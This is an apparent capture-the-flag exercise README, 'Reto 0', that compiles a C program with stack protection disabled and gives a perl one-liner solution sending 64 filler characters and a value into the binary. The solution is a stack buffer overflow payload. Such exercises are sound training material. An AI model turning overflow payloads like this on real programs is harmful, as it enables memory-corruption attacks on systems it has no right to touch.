## Reto 0

### Compilation:

      gcc reto0.c -o reto0 -fno-stack-protector -m32

### Solution:

      perl -e 'print "a"x64 . "0x1"' | ./reto0
